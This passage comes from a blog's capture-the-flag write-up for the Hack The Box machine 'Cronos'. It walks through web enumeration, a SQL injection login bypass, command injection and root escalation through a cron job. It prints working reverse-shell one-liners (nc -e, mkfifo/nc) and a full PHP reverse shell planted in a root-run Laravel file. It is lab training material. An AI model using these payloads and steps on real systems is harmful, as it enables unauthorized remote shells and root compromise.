</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 306<span class=o>]</span> <span class=o>[</span>--&gt; http://cronos.htb/css/<span class=o>]</span>
</span></span><span class=line><span class=cl>/favicon.ico          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2319<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2319<span class=o>]</span>
</span></span><span class=line><span class=cl>Progress: <span class=m>16446</span> / <span class=m>36920</span> <span class=o>(</span>44.54%<span class=o>)</span>
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 305<span class=o>]</span> <span class=o>[</span>--&gt; http://cronos.htb/js/<span class=o>]</span>
</span></span><span class=line><span class=cl>/robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 24<span class=o>]</span>
</span></span><span class=line><span class=cl>/robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 24<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/web.config           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 914<span class=o>]</span>
</span></span><span class=line><span class=cl>Progress: <span class=m>36904</span> / <span class=m>36920</span> <span class=o>(</span>99.96%<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/07/25 15:43:27 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>The results are worthless, so the only thing we can do is to see if there are more virtual hosts with ffuf.</p><p>First I started without the -fw flag, and I see that the default responses have always 3534 words</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u http://10.10.10.13 -H <span class=s2>&#34;Host: FUZZ.cronos.htb&#34;</span> -w ~/Documents/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fw <span class=m>3534</span>  -o vhost <span class=p>|</span> tee vhost.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>   <span class=m>1</span>   │ <span class=o>[</span>Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 121ms<span class=o>]</span>
</span></span><span class=line><span class=cl>   <span class=m>2</span>   │     * FUZZ: www
</span></span><span class=line><span class=cl>   <span class=m>3</span>   │
</span></span><span class=line><span class=cl>   <span class=m>4</span>   │ <span class=o>[</span>Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 2196ms<span class=o>]</span>
</span></span><span class=line><span class=cl>   <span class=m>5</span>   │     * FUZZ: admin
</span></span></code></pre></div><p>As the results shows admin, let’s see what we have at <code>admin.cronos.htb</code> but before we need to put it at <code>etc/hosts</code> file</p><p><img loading=lazy src=/HTB/cronos-3.png alt=Untitled></p><p>It’s a login page and seems so bad constructed</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>First I am going to try the common credentials but nothing is working.</p><p>The login page seem pretty vulnerable to SQLi so I tried a very simple injection</p><p><img loading=lazy src=/HTB/cronos-4.png alt=Untitled></p><p>We have gain access as admin.</p><p><img loading=lazy src=/HTB/cronos-5.png alt=Untitled></p><p>Once inside, we found a text box to execute <strong>ping</strong> or <strong>traceroute</strong> commands in the remote machine.</p><p><img loading=lazy src=/HTB/cronos-6.png alt=Untitled></p><p>This smells like command injection, so I tried to put commands between two semicolons in order to execute them in the remote machine.</p><p>Now, let’s set a nc listener and send a simple reverse shell with nc.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -e /bin/sh 10.10.14.20 <span class=m>4444</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4444</span>
</span></span></code></pre></div><p>This way doesn’t seem to work so maybe we are in front a older linux version. Let’s us this command instead.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>rm</span> <span class=o>/</span><span class=nx>tmp</span><span class=o>/</span><span class=nx>f</span><span class=p>;</span><span class=nx>mkfifo</span> <span class=o>/</span><span class=nx>tmp</span><span class=o>/</span><span class=nx>f</span><span class=p>;</span><span class=nx>cat</span> <span class=o>/</span><span class=nx>tmp</span><span class=o>/</span><span class=nx>f</span><span class=o>|/</span><span class=nx>bin</span><span class=o>/</span><span class=nx>sh</span> <span class=o>-</span><span class=nx>i</span> <span class=mi>2</span><span class=o>&gt;&amp;</span><span class=mi>1</span><span class=o>|</span><span class=nx>nc</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.20</span> <span class=mi>4444</span> <span class=o>&gt;/</span><span class=nx>tmp</span><span class=o>/</span><span class=nx>f</span>
</span></span></code></pre></div><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img loading=lazy src=/HTB/cronos-7.png alt=Untitled></p><p>We are in now, let’s find the user’s flag</p><p><img loading=lazy src=/HTB/cronos-8.png alt=Untitled></p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>I tried to enumerate de sudo -l privileges but a password is requested.</p><p>Other thing we can do is to search for SUID files but before that I realized that maybe the thing which are going to let me privesc is a cron job because the machine name gives us a clue of that. So I build a bash script that help us to monitorize this type of scheduled tasks.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>old_process</span><span class=o>=</span><span class=k>$(</span>ps -eo <span class=nb>command</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nv>new_process</span><span class=o>=</span><span class=k>$(</span>ps -eo <span class=nb>command</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    diff &lt;<span class=o>(</span><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$old_process</span><span class=s2>&#34;</span><span class=o>)</span> &lt;<span class=o>(</span><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$new_process</span><span class=s2>&#34;</span><span class=o>)</span> <span class=p>|</span> grep <span class=s2>&#34;[\&lt;\&gt;\]&#34;</span> <span class=p>|</span> grep -v <span class=s2>&#34;Apple&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nv>old_process</span><span class=o>=</span><span class=nv>$new_process</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></div><p>This script help us to see what scheduled processes are running on the background.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt; <span class=o>[</span>moniProc.sh<span class=o>]</span> &lt;defunct&gt;
</span></span><span class=line><span class=cl>&lt; <span class=o>[</span>moniProc.sh<span class=o>]</span> &lt;defunct&gt;
</span></span><span class=line><span class=cl>&lt; <span class=o>[</span>moniProc.sh<span class=o>]</span> &lt;defunct&gt;
</span></span><span class=line><span class=cl>&lt; <span class=o>[</span>moniProc.sh<span class=o>]</span> &lt;defunct&gt;
</span></span><span class=line><span class=cl>&gt; /usr/sbin/CRON -f
</span></span><span class=line><span class=cl>&gt; /bin/sh -c php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span><span class=line><span class=cl>&gt; php /var/www/laravel/artisan schedule:run
</span></span><span class=line><span class=cl>&lt; /usr/sbin/CRON -f
</span></span><span class=line><span class=cl>&lt; /bin/sh -c php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span><span class=line><span class=cl>&lt; php /var/www/laravel/artisan schedule:run
</span></span><span class=line><span class=cl>&lt; <span class=o>[</span>kworker/u2:30<span class=o>]</span>
</span></span><span class=line><span class=cl>&lt; <span class=o>[</span>kworker/u2:3<span class=o>]</span>
</span></span><span class=line><span class=cl>&lt; <span class=o>[</span>kworker/u2:4<span class=o>]</span>
</span></span></code></pre></div><p>Once executed the script we can see that the <strong>cron job</strong> is executing the following command</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/bin/sh -c php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span></code></pre></div><p>This <strong>bash command</strong> is running <strong>php</strong> file at the <strong>laravel directory</strong>, as we know the cron jobs are executed as root so we only need to change the content of the artisan file in order to put a <a href=https://pentestmonkey.net/tools/web-shells/php-reverse-shell>php-reverse-shell</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>set_time_limit</span> <span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$VERSION</span> <span class=o>=</span> <span class=s2>&#34;1.0&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=s1>&#39;10.10.14.20&#39;</span><span class=p>;</span>  <span class=c1>// CHANGE THIS
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$port</span> <span class=o>=</span> <span class=mi>4445</span><span class=p>;</span>       <span class=c1>// CHANGE THIS
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$chunk_size</span> <span class=o>=</span> <span class=mi>1400</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$write_a</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$error_a</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$shell</span> <span class=o>=</span> <span class=s1>&#39;uname -a; w; id; /bin/sh -i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$daemon</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$debug</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1>// Daemonise ourself if possible to avoid zombies later
</span></span></span><span class=line><span class=cl><span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// pcntl_fork is hardly ever available, but will allow us to daemonise
</span></span></span><span class=line><span class=cl><span class=c1>// our php process and avoid zombies.  Worth a try...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;pcntl_fork&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// Fork and have the parent process exit
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nv>$pid</span> <span class=o>=</span> <span class=nx>pcntl_fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Can&#39;t fork&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>  <span class=c1>// Parent exits
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Make the current process a session leader
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// Will only succeed if we forked
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=nx>posix_setsid</span><span class=p>()</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;Error: Can&#39;t setsid()&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$daemon</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Change to a safe directory
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Remove any umask we inherited
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>umask</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1>// Do the reverse shell...
</span></span></span><span class=line><span class=cl><span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// Open reverse connection
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$sock</span> <span class=o>=</span> <span class=nx>fsockopen</span><span class=p>(</span><span class=nv>$ip</span><span class=p>,</span> <span class=nv>$port</span><span class=p>,</span> <span class=nv>$errno</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=mi>30</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$sock</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$errstr</span><span class=s2> (</span><span class=si>$errno</span><span class=s2>)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Spawn shell process
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$descriptorspec</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=mi>0</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>),</span>  <span class=c1>// stdin is a pipe that the child will read from
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=mi>1</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>),</span>  <span class=c1>// stdout is a pipe that the child will write to
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=mi>2</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span>   <span class=c1>// stderr is a pipe that the child will write to
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$process</span> <span class=o>=</span> <span class=nx>proc_open</span><span class=p>(</span><span class=nv>$shell</span><span class=p>,</span> <span class=nv>$descriptorspec</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_resource</span><span class=p>(</span><span class=nv>$process</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Can&#39;t spawn shell&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Set everything to non-blocking
</span></span></span><span class=line><span class=cl><span class=c1>// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;Successfully opened reverse shell to </span><span class=si>$ip</span><span class=s2>:</span><span class=si>$port</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// Check for end of TCP connection
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$sock</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Shell connection terminated&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Check for end of STDOUT
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Shell process terminated&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Wait until a command is end down $sock, or some
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// command output is available on STDOUT or STDERR
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nv>$read_a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$num_changed_sockets</span> <span class=o>=</span> <span class=nx>stream_select</span><span class=p>(</span><span class=nv>$read_a</span><span class=p>,</span> <span class=nv>$write_a</span><span class=p>,</span> <span class=nv>$error_a</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// If we can read from the TCP socket, send
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// data to process&#39;s STDIN
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;SOCK READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;SOCK: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>fwrite</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// If we can read from the process&#39;s STDOUT
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// send data down tcp connection
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDOUT READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDOUT: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>fwrite</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// If we can read from the process&#39;s STDERR
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// send data down tcp connection
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDERR READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDERR: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>fwrite</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$sock</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>proc_close</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Like print, but does nothing if we&#39;ve daemonised ourself
</span></span></span><span class=line><span class=cl><span class=c1>// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>printit</span> <span class=p>(</span><span class=nv>$string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$daemon</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>print</span> <span class=s2>&#34;</span><span class=si>$string\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>We need to change the ip and the port to our listening ports.</p><p>Now only rests to set a listener and wait until the cronjob is executed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4445</span>
</span></span></code></pre></div><p><img loading=lazy src=/HTB/cronos-9.png alt=Untitled></p><p>Let’s cat the <strong>root’s flag</strong></p><p><img loading=lazy src=/HTB/cronos-10.png alt=Untitled></p><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/privesc/>Privesc</a></li><li><a href=http://localhost:1313/tags/web/>Web</a></li><li><a href=http://localhost:1313/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>PwndSide</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>